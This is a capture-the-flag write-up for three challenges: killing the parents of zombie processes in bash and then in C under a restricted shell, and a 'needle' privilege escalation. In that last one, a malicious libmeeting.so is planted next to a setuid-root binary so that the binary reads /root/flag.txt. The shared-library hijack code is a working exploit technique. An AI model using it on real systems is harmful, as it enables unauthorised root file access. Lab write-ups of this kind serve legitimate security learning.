- [princess](princess)
Cabins are parent processes, princesses are their child processes, and dead princesses are zombies. You can’t kill a zombie, but if you kill its parent, the system cleans it up. So the script finds cabins with dead princesses and kills them until 50 are gone.
```bash
ctf@11f630232208:~$ ps -eo pid,ppid,stat,comm --forest | grep -v -e dropbear -e bash -e ps
    PID    PPID STAT COMMAND
      1       0 Ss   the_forest
    460     101 S+            \_ grep
    376       1 S    the_last_cabin
    377     376 S     \_ princess_tower
    378     376 S     \_ the_coin
    379     376 S     \_ the_rope
    380       1 S    the_old_cabin
    381     380 S     \_ princess_razor
    382     380 S     \_ the_shield
    383     380 S     \_ the_rope
    384       1 S    the_dead_cabin
    385     384 Z     \_ princess_cage
    386     384 S     \_ the_crown
    387     384 S     \_ the_key
    388     384 S     \_ the_chain
    389       1 S    the_ash_cabin
    390     389 S     \_ princess_briar
    391     389 S     \_ the_skull
    392     389 S     \_ the_blade
    393       1 S    the_ash_cabin
    394     393 S     \_ princess_moth
    395     393 S     \_ the_blade
    396     393 S     \_ the_helm
    397       1 S    the_cabin
    398     397 Z     \_ princess_wild
    399     397 S     \_ the_glass
    400     397 S     \_ the_locket
    401     397 S     \_ the_rope
    402       1 S    the_fog_cabin
    403     402 Z     \_ princess_snow
    404     402 S     \_ the_key
    405     402 S     \_ the_candle
    406     402 S     \_ the_doll
    407       1 S    the_last_cabin
    408     407 Z     \_ princess_moth
    409     407 S     \_ the_shield
    410     407 S     \_ the_axe
    411       1 S    the_far_cabin
    412     411 Z     \_ princess_briar
    413     411 S     \_ the_glass
    414     411 S     \_ the_chain
    416       1 S    the_dark_cabin
    417     416 S     \_ princess_tower
    418     416 S     \_ the_coin
    419     416 S     \_ the_locket
    420     416 S     \_ the_chain
    421       1 S    the_hill_cabin
    422     421 Z     \_ princess_cage
    423     421 S     \_ the_rope
    424     421 S     \_ the_coin
    425       1 S    cabin_in_pines
    426     425 S     \_ princess_den
    427     425 S     \_ the_knife
    428     425 S     \_ the_crown
    429       1 S    the_ivy_cabin
    430     429 S     \_ princess_chains
    431     429 S     \_ the_blade
    432     429 S     \_ the_gem
    433     429 S     \_ the_candle
    434       1 S    the_quiet_cabin
    435     434 Z     \_ princess_fury
    436     434 S     \_ the_glass
    437     434 S     \_ the_sword
    438       1 S    the_burnt_cabin
    439     438 S     \_ princess_glass
    440     438 S     \_ the_blade
    441     438 S     \_ the_crown
    442       1 S    the_red_cabin
    443     442 Z     \_ princess_tower
    444     442 S     \_ the_ring
    445     442 S     \_ the_doll
    446     442 S     \_ the_chain
    447       1 S    the_far_cabin
    448     447 S     \_ princess_veil
    449     447 S     \_ the_mirror
    450     447 S     \_ the_doll
    451       1 S    the_red_cabin
    452     451 Z     \_ princess_ember
    453     451 S     \_ the_skull
    454     451 S     \_ the_key
    455       1 S    the_moss_cabin
    456     455 Z     \_ princess_briar
    457     455 S     \_ the_veil
    458     455 S     \_ the_shield
ctf@11f630232208:~$ n=0; while [ $n -lt 50 ]; do
  for p in $(ps -eo ppid=,stat=,comm= | awk '$2~/Z/ && $3~/^princess/ && $1!=1 {print $1}'); do
    kill $p && n=$((n+1)) && echo "$p ($n)"
  done
  sleep 0.2
done; echo DONE
792 (1)
809 (2)
826 (3)
835 (4)
866 (5)
871 (6)
900 (7)
961 (8)
1211 (9)
1525 (10)
1590 (11)
1959 (12)
2019 (13)
3212 (14)
3337 (15)
3649 (16)
3712 (17)
3774 (18)
4026 (19)
4087 (20)
4212 (21)
4277 (22)
4402 (23)
4526 (24)
4651 (25)
5129 (26)
5193 (27)
5536 (28)
5724 (29)
5785 (30)
5850 (31)
6100 (32)
6486 (33)
6551 (34)
6798 (35)
6924 (36)
6984 (37)
7049 (38)
7235 (39)
7646 (40)
7847 (41)
7911 (42)
8097 (43)
8222 (44)
8483 (45)
8671 (46)
8732 (47)
8922 (48)
9348 (49)

=== The Forest ===
The forest falls silent. 50 cursed cabins lie in ruin, and
the story is finally over. Your reward waits in your home
directory.

^C
ctf@29bdffcd927e:~$ ls -la
total 28
drwx------ 1 ctf  ctf  4096 Nov 17 18:20 .
drwxr-xr-x 1 root root 4096 Oct 26 10:52 ..
-rw-r--r-- 1 ctf  ctf   220 Jul 12 16:58 .bash_logout
-rw-r--r-- 1 ctf  ctf  3526 Jul 12 16:58 .bashrc
-rw-r--r-- 1 ctf  ctf   807 Jul 12 16:58 .profile
-rw-r--r-- 1 root root   50 Nov 17 18:20 flag.txt
ctf@29bdffcd927e:~$ cat ~/ flag.txt
cat: /home/ctf/: Is a directory
threadctf{whA7_do_YOU_m3an_They_ArE_4lr3ADY_dead}
ctf@29bdffcd927e:~$ 
```
- [princess2](princess2)
Same task, but now 100 cabins, and the shell is restricted.
```bash
Connected!

╔═══════════════════════════════════════════════════════════╗
║  The forest kept your shell. It won't give it back.       ║
║  All you have left is gcc and whatever you compile.       ║
║                                                           ║
║  Allowed: gcc, vim/nano, rm and ./binaries                ║
║  Forbidden: Everything else                               ║
╚═══════════════════════════════════════════════════════════╝

story-shell:/home/ctf$ nano blade.c
story-shell:/home/ctf$ gcc -O2 -o blade blade.c
story-shell:/home/ctf$ ./blade
162 (1)
187 (2)
197 (3)
202 (4)
216 (5)
221 (6)
229 (7)
...
1145 (99)
1149 (100)
story-shell:/home/ctf$ 
=== The Forest ===
The forest falls silent. 100 cursed cabins lie in ruin, and
the story is finally over. Your reward waits in your home
directory.

^CConnection to osctf.nnk.moe closed.
```
blade.c reimplements the loop in C. It walks /proc, reads each /proc/<pid>/stat to get the process name, state and parent PID, and when it finds a zombie princess it sends SIGTERM to her parent cabin. It repeats until 100 cabins are destroyed.
```c
#include <stdio.h>
#include <dirent.h>
#include <signal.h>
#include <unistd.h>

int main(void) {
    int n = 0;
    while (n < 100) {
        DIR *d = opendir("/proc");
        struct dirent *e;
        while ((e = readdir(d))) {
            char path[300], name[64], st; int ppid;
            sprintf(path, "/proc/%s/stat", e->d_name);
            FILE *f = fopen(path, "r");
            if (!f) continue;
            if (fscanf(f, "%*d (%63[^)]) %c %d", name, &st, &ppid) == 3
                && st == 'Z' && name[0] == 'p' && ppid > 1
                && kill(ppid, SIGTERM) == 0)
                printf("%d (%d)\n", ppid, ++n);
            fclose(f);
        }
        closedir(d);
        usleep(100000);
    }
    return 0;
}
```

look.c replaces ls and cat: run without arguments, it lists the current directory; given a filename, it prints the file. This is how flag.txt was read.
```c
#include <stdio.h>
#include <dirent.h>

int main(int argc, char **argv) {
    if (argc > 1) {                     
        FILE *f = fopen(argv[1], "r");
        if (!f) { perror(argv[1]); return 1; }
        char buf[4096]; size_t n;
        while ((n = fread(buf, 1, sizeof buf, f)) > 0) fwrite(buf, 1, n, stdout);
        fclose(f);
        return 0;
    }
    DIR *d = opendir(".");  
    struct dirent *e;
    while ((e = readdir(d))) puts(e->d_name);
    closedir(d);
    return 0;
}
```

```bash
story-shell:/home/ctf$ nano look.c
story-shell:/home/ctf$ gcc -o look look.c
story-shell:/home/ctf$ ./look
.
.profile
.bash_logout
.bashrc
..
flag.txt
blade.c
look.c
blade
.local
look
story-shell:/home/ctf$ ./look flag.txt
threadctf{i_HoPE_you_caN_C_clEar1y_Now}
story-shell:/home/ctf$ 
```
- [needle](needle)
meeting runs as root. It reads /root/flag.txt but only prints whatever our meeting() function returns, loaded from libmeeting.so into the same root process. So we make our meeting() read the flag and return it as the “name” — and the program prints it.
```bash
Connected!
ctf@f5556af349d2:~$ ls
meeting
ctf@f5556af349d2:~$ ls -la
total 40
drwx------ 1 ctf  ctf   4096 Oct 26 10:53 .
drwxr-xr-x 1 root root  4096 Oct 26 10:52 ..
-rw-r--r-- 1 ctf  ctf    220 Jul 12 16:58 .bash_logout
-rw-r--r-- 1 ctf  ctf   3526 Jul 12 16:58 .bashrc
-rw-r--r-- 1 ctf  ctf    807 Jul 12 16:58 .profile
-rwsr-xr-x 1 root root 16712 Oct 20 14:17 meeting
ctf@f5556af349d2:~$ id
uid=1000(ctf) gid=1000(ctf) groups=1000(ctf)
ctf@f5556a 
ctf@f5556af349d2:~$ ./meeting
Failed to load library. Cant have a meeting. Error: ./libmeeting.so: cannot open shared object file: No such file or directory
ctf@f5556af349d2:~$ nano program_with_name.c
ctf@f5556af349d2:~$ gcc -shared -fPIC -o libmeeting.so program_with_name.c -lpthread
ctf@f5556af349d2:~$ ./meeting
Polythread has your concent and name: threadctf{sh0o7iNg_5OmE_a7OmIC_fE3t}

Good luck, you'll be dyeing the buttons forever now!
What did you think was going to happen when you give up your name to fay?
ctf@f5556af349d2:~$ Connected!
```
program_with_name.c provides a meeting() function. Because it runs as root inside the binary, it opens /root/flag.txt, reads it, and returns the text. The binary prints that as the “name”, which is the flag.
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void* meeting(void* arg) {
    char* name = malloc(256);
    FILE* f = fopen("/root/flag.txt", "r");
    fgets(name, 255, f);
    fclose(f);
    return name;
}
```
